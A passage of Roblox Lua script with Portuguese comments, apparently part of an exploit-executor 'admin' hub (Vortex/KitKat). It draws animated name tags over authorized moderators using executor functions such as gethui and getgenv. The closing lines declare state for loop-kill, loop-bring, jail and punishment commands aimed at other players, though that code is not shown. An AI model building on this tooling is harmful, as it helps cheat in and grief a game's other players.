        table.insert(containers, game:GetService("CoreGui"))
        local wanted = "VortexTag_" .. tostring(player.UserId)
        for _, container in ipairs(containers) do
            if container then
                local old = container:FindFirstChild(wanted)
                if old then old:Destroy() end
            end
        end
    end)

    local TweenService = game:GetService("TweenService")
    local TextService = game:GetService("TextService")
    local RED = Color3.fromRGB(255, 0, 0)

    local billboardGui = Instance.new("BillboardGui")
    billboardGui.Name = "VortexTag_" .. tostring(player.UserId)
    billboardGui.Adornee = head
    billboardGui.Size = UDim2.new(0, 220, 0, 100)
    billboardGui.AlwaysOnTop = true
    billboardGui.StudsOffset = Vector3.new(0, 3, 0)
    billboardGui.MaxDistance = 120
    billboardGui.ResetOnSpawn = false

    -- guardada fora do personagem: sobrevive a morte e troca de skin
    local guiParent
    pcall(function()
        if gethui then guiParent = gethui() end
    end)
    if not guiParent then
        guiParent = Players.LocalPlayer:FindFirstChildOfClass("PlayerGui") or game:GetService("CoreGui")
    end
    billboardGui.Parent = guiParent

    -- brilho pulsando atrás da foto
    local glow = Instance.new("Frame", billboardGui)
    glow.Size = UDim2.new(0, 60, 0, 60)
    glow.Position = UDim2.new(0.5, -30, 0, -1)
    glow.BackgroundColor3 = RED
    glow.BackgroundTransparency = 0.8
    glow.BorderSizePixel = 0
    Instance.new("UICorner", glow).CornerRadius = UDim.new(1, 0)

    -- foto de perfil do jogador (redonda, com anel vermelho)
    local icon = Instance.new("ImageLabel", billboardGui)
    icon.Size = UDim2.new(0, 46, 0, 46)
    icon.Position = UDim2.new(0.5, -23, 0, 6)
    icon.BackgroundColor3 = Color3.fromRGB(10, 0, 0)
    icon.BorderSizePixel = 0
    icon.Image = "rbxthumb://type=AvatarHeadShot&id=" .. tostring(player.UserId) .. "&w=150&h=150"
    icon.ScaleType = Enum.ScaleType.Crop
    Instance.new("UICorner", icon).CornerRadius = UDim.new(1, 0)

    local iconStroke = Instance.new("UIStroke", icon)
    iconStroke.Color = RED
    iconStroke.Thickness = 2.5
    iconStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

    -- nome do jogador (troque DisplayName por Name se preferir o @)
    local nameLabel = Instance.new("TextLabel", billboardGui)
    nameLabel.Size = UDim2.new(1, 0, 0, 16)
    nameLabel.Position = UDim2.new(0, 0, 0, 55)
    nameLabel.BackgroundTransparency = 1
    nameLabel.Text = (player.DisplayName ~= "" and player.DisplayName) or player.Name
    nameLabel.Font = Enum.Font.Arcade -- fonte pixelada estilo Minecraft
    nameLabel.TextSize = 18
    nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    nameLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    nameLabel.TextStrokeTransparency = 0

    -- pílula do cargo (largura calculada pelo texto, sem esticar)
    local upperText = string.upper(tagText)
    local okSize, textSize = pcall(function()
        return TextService:GetTextSize(upperText, 13, Enum.Font.GothamBold, Vector2.new(1000, 50))
    end)
    local pillWidth = (okSize and textSize.X or (#upperText * 8)) + 30

    local background = Instance.new("ImageLabel", billboardGui)
    background.Size = UDim2.new(0, pillWidth, 0, 24)
    background.Position = UDim2.new(0.5, -pillWidth / 2, 0, 74)
    background.Image = "rbxassetid://"
    background.BackgroundColor3 = Color3.fromRGB(10, 0, 0)
    background.BackgroundTransparency = 0.1
    background.BorderSizePixel = 0

    Instance.new("UICorner", background).CornerRadius = UDim.new(1, 0)

    local stroke = Instance.new("UIStroke", background)
    stroke.Color = RED
    stroke.Thickness = 2.2
    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

    -- gradiente que gira no contorno da pílula
    local grad = Instance.new("UIGradient", stroke)
    grad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(90, 0, 0)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 0)),
    })

    local textLabel = Instance.new("TextLabel", background)
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.Text = upperText
    textLabel.TextColor3 = Color3.fromRGB(255, 235, 235)
    textLabel.TextSize = 13
    textLabel.Font = Enum.Font.GothamBold
    textLabel.TextStrokeTransparency = 0.35
    textLabel.TextStrokeColor3 = Color3.fromRGB(120, 0, 0)

    -- animações (param sozinhas quando a tag é destruída)
    pcall(function()
        TweenService:Create(grad, TweenInfo.new(2.5, Enum.EasingStyle.Linear, Enum.EasingDirection.Out, -1), {Rotation = 360}):Play()
        TweenService:Create(glow, TweenInfo.new(1.1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {BackgroundTransparency = 0.94}):Play()
    end)

    ActiveTags[playerName] = { Billboard = billboardGui, TagText = tagText }
end

local function createSpecialTag(player)
    if not player then return end

    local function apply()
        local tagText
        if getgenv().KitKatConfig.SpecialTags[player.Name] then
            tagText = getgenv().KitKatConfig.SpecialTags[player.Name]
        elseif IsPlayerAuthorized(player.Name) then
            tagText = "Moderador Vortex"
        end

        if tagText then
            local at = ActiveTags[player.Name]
            if not at or at.TagText ~= tagText or not at.Billboard or not at.Billboard.Parent then
                CreatePlayerTag(player.Name, tagText)
            end
        else
            RemovePlayerTag(player.Name)
        end
    end

    pcall(apply)

    trackConnection(player.CharacterAdded:Connect(function()
        task.wait(0.5)
        pcall(apply)
    end))
end

for _, p in pairs(Players:GetPlayers()) do
    createSpecialTag(p)
end

trackConnection(Players.PlayerAdded:Connect(function(p)
    createSpecialTag(p)
end))

trackConnection(Players.PlayerRemoving:Connect(function(player)
    RemovePlayerTag(player.Name)
end))

-- Vigia: mantém a tag SEMPRE ativa (morte, troca de skin, respawn)
trackThread(task.spawn(function()
    while true do
        task.wait(0.4)
        for _, p in ipairs(Players:GetPlayers()) do
            pcall(function()
                local tagText
                if getgenv().KitKatConfig.SpecialTags[p.Name] then
                    tagText = getgenv().KitKatConfig.SpecialTags[p.Name]
                elseif IsPlayerAuthorized(p.Name) then
                    tagText = "Moderador Vortex"
                end
                if not tagText then return end

                local head = p.Character and p.Character:FindFirstChild("Head")
                local data = ActiveTags[p.Name]

                if not data or not data.Billboard or not data.Billboard.Parent or data.TagText ~= tagText then
                    if head then CreatePlayerTag(p.Name, tagText) end
                elseif not head then
                    -- morreu / sem cabeça no momento: esconde em vez de deixar presa no ar
                    data.Billboard.Enabled = false
                elseif data.Billboard.Adornee ~= head or head.Parent == nil then
                    -- cabeça nova (respawn/troca de skin): reposiciona de verdade
                    data.Billboard.Adornee = head
                    data.Billboard.Enabled = true
                elseif not data.Billboard.Enabled then
                    data.Billboard.Enabled = true
                end
            end)
        end
    end
end))

-- Variáveis globais do sistema
local TEMP_MODS = {}
local Trakis_USERS = {}
local playerOriginalSpeed = {}
local CASTIGO_PLAYERS = {}
local INVISIBLE_JAILED_PLAYERS = {}
local LOOP_KILL_PLAYERS = {}
local LOOP_BRING_PLAYERS = {}
local LOOP_SIT_PLAYERS = {}
local LOOP_FIRE_PLAYERS = {}
local jaulas = {}
local jailConnections = {}
